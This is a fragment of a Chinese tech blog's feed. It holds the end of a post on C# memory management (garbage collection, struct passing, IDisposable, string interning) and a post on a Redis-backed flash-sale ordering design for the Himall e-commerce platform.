&lt;h2 id=&quot;垃圾回收器GC&quot;&gt;&lt;a href=&quot;#垃圾回收器GC&quot; class=&quot;headerlink&quot; title=&quot;垃圾回收器GC&quot;&gt;&lt;/a&gt;垃圾回收器GC&lt;/h2&gt;&lt;p&gt;垃圾回收器为什么不会立即回收对象?&lt;br&gt;对象不再被引用时,如果立即删除,堆上的自由空间就会分散开来，给新对象分配内存就会很难处理,程序必须搜索整个堆才能找到一块足够大的内存块来存储整个新对象。&lt;br&gt;整个heap中对象的引用关系错综复杂（交叉引用、循环引用），形成复杂的graph。heap对应有一个Roots，它能使程序在heap之外可以找到的各种入口点。root包括:全局对象、静态变量、局部对象、函数调用参数、当前CPU寄存器中的对象指针。&lt;br&gt;下面可以通过一组图片来进一步了解GC的工作。黄色代表还在引用的对象，灰色代表没有引用的对象。&lt;br&gt;现在内存使用已达到阀值,GC需要清理内存，下图就是GC整个清理的过程。&lt;br&gt;&lt;img src=&quot;/img/CSharp-5.gif&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;&lt;img src=&quot;/img/CSharp-6.gif&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;&lt;img src=&quot;/img/CSharp-7.gif&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;&lt;img src=&quot;/img/CSharp-8.gif&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;GC回收内存是一种非常耗费性能的工作，减少不必要的内存使用有助于提高GC性能&lt;/p&gt;
&lt;h2 id=&quot;传参的优化&quot;&gt;&lt;a href=&quot;#传参的优化&quot; class=&quot;headerlink&quot; title=&quot;传参的优化&quot;&gt;&lt;/a&gt;传参的优化&lt;/h2&gt;&lt;p&gt;如果我们要将一个非常大的值类型数据(如数据量大的struct类型)入栈，它会占用非常大的内存空间，而且会占有过多的处理器资源来进行拷贝复制。&lt;br&gt;&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; ConstNum&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; a,b,c,d,e,f,g,h,i,j,k;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;  &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Go&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ConstNum x = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ConstNum();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	Do(x);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;  &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Do&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;ConstNum x&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//do something&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以将struct改为class。实例对象之后则是引用类型。或使用ref关键字将方法改为Do(ref ConstNum x)，也可以达到引用类型的作用。&lt;/p&gt;
&lt;h2 id=&quot;静态&quot;&gt;&lt;a href=&quot;#静态&quot; class=&quot;headerlink&quot; title=&quot;静态&quot;&gt;&lt;/a&gt;静态&lt;/h2&gt;&lt;p&gt;有一个Dude类，你需要实例化多个对像使用。&lt;br&gt;&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Class Dude&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; _name =&lt;span class=&quot;string&quot;&gt;&quot;test&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;SayHello&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;//DoSomething&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/CSharp-9.gif&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;你可以使用静态方法,以达到内存节省的目的。&lt;br&gt;&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Class Dude&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; _name =&lt;span class=&quot;string&quot;&gt;&quot;test&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;SayHello&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;//DoSomething&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/CSharp-10.gif&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;实际项目中使用单例模式来达到省内存的目的。&lt;/p&gt;
&lt;h2 id=&quot;IDisposable与析构函数&quot;&gt;&lt;a href=&quot;#IDisposable与析构函数&quot; class=&quot;headerlink&quot; title=&quot;IDisposable与析构函数&quot;&gt;&lt;/a&gt;IDisposable与析构函数&lt;/h2&gt;&lt;p&gt;托管的资源只能由CG回收。而非托管的资源可以通过实现IDisposable进行释放。&lt;br&gt;&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;CDisposable&lt;/span&gt; : &lt;span class=&quot;title&quot;&gt;IDisposable&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//析构函数，编译后变成 protected void Finalize()，GC会在回收对象前会调用调用该方法 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ~CDisposable() &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        Dispose(&lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//通过实现该接口，显式地释放对象，只针对非托管对象。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Dispose&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        Dispose(&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Dispose调用&lt;/p&gt;
&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Using(MyClass myObj = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; CDisposable())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//DoSomething&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或者直接调myObj.Dispose();&lt;/p&gt;
&lt;h2 id=&quot;字符串的内存规则&quot;&gt;&lt;a href=&quot;#字符串的内存规则&quot; class=&quot;headerlink&quot; title=&quot;字符串的内存规则&quot;&gt;&lt;/a&gt;字符串的内存规则&lt;/h2&gt;&lt;p&gt;string是引用类型，但string的值是不可变，但你改变string值的时候会对新值重新分配内存,老值仍驻留在内存中。&lt;/p&gt;
&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; a = &lt;span class=&quot;string&quot;&gt;&quot;1234&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a += &lt;span class=&quot;string&quot;&gt;&quot;5678&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Console.ReadLine();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;看起来我们似乎已经把a的值从“1234”改为了“12345678”，实际上并没有改变。因为string的值是无法修改不了了。堆中其实存在着两个字符串对象。字符串“1234”仍然在内存中驻留。&lt;/p&gt;
&lt;p&gt;string容易引起内存驻留，但我们仍有办法减少内存使用。&lt;/p&gt;
&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; str1 = &lt;span class=&quot;string&quot;&gt;&quot;ABCD1234&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; str2 = &lt;span class=&quot;string&quot;&gt;&quot;ABCD1234&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; str3 = &lt;span class=&quot;string&quot;&gt;&quot;ABCD&quot;&lt;/span&gt; + &lt;span class=&quot;string&quot;&gt;&quot;1234&quot;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; str4 = &lt;span class=&quot;string&quot;&gt;&quot;1234&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; str5 = &lt;span class=&quot;string&quot;&gt;&quot;ABCD&quot;&lt;/span&gt; + str4;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;object&lt;/span&gt;.ReferenceEquals(str1, str2) == True；&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;object&lt;/span&gt;.ReferenceEquals(str1, str3) == True；&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;object&lt;/span&gt;.ReferenceEquals(str1, str5) == False&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过上面比较，字符串都驻留在内存。尽量使用字符串相加来代替字符串变量和字符创相加，这样可以使用重复利用字符串驻留，减少内存使用。&lt;/p&gt;
&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; str3 = &lt;span class=&quot;string&quot;&gt;&quot;ABCD&quot;&lt;/span&gt; + &lt;span class=&quot;string&quot;&gt;&quot;1234&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;对string作频繁的操作使用StringBuilder或string.format(也是StringBuilder实现)处理。&lt;br&gt;StringBuilder内部维护一个字符数组，而不是一个string来避免string操作带来的新的string的创建。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;CSharp&quot;&gt;StringBuilder sb = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; StringBuilder();
sb.Append(str1);
sb.Append(str2);
sb.Append(str3);
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;CSharp&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; sb = &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;.format(&lt;span class=&quot;string&quot;&gt;&quot;{0}{1}{2}&quot;&lt;/span&gt;,str1,str2,str3);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;相当于sb = str1 + str2 + str3;&lt;/p&gt;
&lt;p&gt;4.高效地进行string的比较操作&lt;br&gt;对象之间的比较有比较Value和比较Reference之说。一般地对Reference进行比较的速度最快，因为只需要比较一下是不是同一地址就行了。&lt;br&gt;object.ReferenceEquals和string. Compare就是引用比较的方法。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;.net不必手工管理内存，但要编写高性能的代码，就仍需理解后面发生的事情。&lt;/p&gt;
&lt;h2 id=&quot;内存模型-堆与栈&quot;&gt;&lt;a href=&quot;#内存模型-堆与栈&quot; class=&quot;headerlink&quot; title=&quot;内存模型:堆与栈&quot;&gt;&lt;/a&gt;内存模型:堆与栈&lt;/h2&gt;&lt;p&gt;C#内存主要有两类：Stack和Heap&lt;br&gt;Stack叫做栈区，由编译器自动分配释放，存放函数的参数值，局部变量的值等。&lt;br&gt;Heap则称之为堆区，由开发人员申请内存，在垃圾回收器的控制下工作。&lt;br&gt;&lt;img src=&quot;/img/CSharp-1.jpg&quot; alt=&quot;效果&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>浅谈Himall商城限时购设计</title>
    <link href="http://binyanbin.github.io/2016/04/21/hishop-1/"/>
    <id>http://binyanbin.github.io/2016/04/21/hishop-1/</id>
    <published>2016-04-20T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;互联网正在高速发展，使用互联网服务的用户越多，高并发的场景也变得越来越多。&lt;a href=&quot;http://www.hishop.com.cn/products/himall/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Himall&lt;/a&gt;限时购功能则是一个典型的短时间高并发场景。虽然我们解决问题的具体技术方案可能千差万别，但是遇到的挑战却是相似的，因此解决问题的思路也异曲同工。&lt;br&gt;什么是限时购?限时购跟大部分电商抢购业务相同,即限时且限量抢购。不管小米还是华为，或是其它电商公司，对抢购业务运营总是最为火爆，每发一款新品，都限量发售，每次搞的大家心里痒痒的。抢购太火爆有时引起站点打不开，崩溃了;还有就是卖出的数量比设置可购买的数量要多。那么问题来了：我们如何在设计中如何解决。通常我们需要从设计中考虑以下问题:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;针对高并发，我们如何解耦后端压力，特别是数据库的压力。&lt;/li&gt;
&lt;li&gt;如何保障库存可靠。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们可以试想一下抢购时哪些页面会请求最多。抢购之前人们通常会通常刷页面等待，一般在抢购开始前一点时间会频繁刷新抢购倒数的页面或购买详情页面。抢购开始以后前一段时间下单的人会很多。付款并发量相对较小，通常订单在下单后几小时内都能付款，缓解了并发压力。针对以上问题及场景，我们做了以下处理，增加限时购缓存订单系统，去支持限时购高并发处理，并保持限时购业务的可靠性。&lt;br&gt;&lt;img src=&quot;/img/hishop-1.png&quot; alt=&quot;图1&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.hishop.com.cn/products/himall/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hiamll&lt;/a&gt;在2.3版本做了如下改进:&lt;br&gt;1.引入Redis做缓存。&lt;br&gt;2.在用户抢购开始前频繁刷页面时,系统只从缓存中取商品数据，解耦了数据库查询的压力。&lt;br&gt;3.用户下单时系统只把订单数据存入订单缓存队列后然后告诉用户你的订单正在处理。然后由Redis Pub/Sub服务通知Web服务器，服务器把库存订单进行串行化处理，解耦数据库并发下单压力，保证库存可靠。&lt;br&gt;4.支付功能保持原来实现不变。&lt;/p&gt;
&lt;p&gt;具体实现如下:&lt;br&gt;买家前端查询限时购商品数据时只走缓存。&lt;br&gt;&lt;img src=&quot;/img/hishop-2.png&quot; alt=&quot;图2&quot;&gt;&lt;br&gt;卖家后台更新限时购或库存信息时需同步更新数据库及缓存。&lt;br&gt;&lt;img src=&quot;/img/hishop-3.png&quot; alt=&quot;图3&quot;&gt;&lt;br&gt;系统为每个正在开卖的限时购商品库存创建锁，买家对某库存下单时锁住该库存的下单操作，每一个商品库存只允许一个会员下单，下单的订单数据直接加入订单缓存后告诉买家[您的订单正在处理,请稍等]。然后通过Redis Pub/Sub服务通知服务器处理订单，将订单按库存串行化处理，订单处理完成后，则更新限时购订单缓存的处理状态。&lt;br&gt;&lt;img src=&quot;/img/hishop-4.png&quot; alt=&quot;图4&quot;&gt;&lt;br&gt;买家得知订单正在处理后，则不断查询缓存的订单处理状态。直到获取订单处理结果，下单成功则进行支付页面，失败则提示失败原因并引导买家重新下单。&lt;br&gt;&lt;img src=&quot;/img/hishop-5.png&quot; alt=&quot;图5&quot;&gt;&lt;br&gt;最后就是在Web服务启动时，需要对限时购订单缓存系统初始化，把商品数据加入缓存中，并处理上次未处理完成的订单。&lt;br&gt;&lt;img src=&quot;/img/hishop-6.png&quot; alt=&quot;图6&quot;&gt;&lt;/p&gt;
&lt;p&gt;总结:无论你用什么方式处理性能问题，性能优化的核心思想是分治。这种思想在日常生活中无处不在，大家都知道一次做不了的事，就分多次做，这就是分治。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;互联网正在高速发展，使用互联网服务的用户越多，高并发的场景也变得越来越多。&lt;a href=&quot;http://www.hishop.com.cn/products/himall/&quot;&gt;Himall&lt;/a&gt;限时购功能则是一个典型的短时间高并发场景。虽然我们解决问题的具体技术方案可能千差万别，但是遇到的挑战却是相似的，因此解决问题的思路也异曲同工。&lt;br&gt;什么是限时购?限时购跟大部分电商抢购业务相同,即限时且限量抢购。不管小米还是华为，或是其它电商公司，对抢购业务运营总是最为火爆，每发一款新品，都限量发售，每次搞的大家心里痒痒的。抢购太火爆有时引起站点打不开，崩溃了;还有就是卖出的数量比设置可购买的数量要多。那么问题来了：我们如何在设计中如何解决。通常我们需要从设计中考虑以下问题:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;针对高并发，我们如何解耦后端压力，特别是数据库的压力。&lt;/li&gt;
&lt;li&gt;如何保障库存可靠。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>C windows版开源http服务</title>
    <link href="http://binyanbin.github.io/2016/04/17/c-7/"/>
    <id>http://binyanbin.github.io/2016/04/17/c-7/</id>
    <published>2016-04-16T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
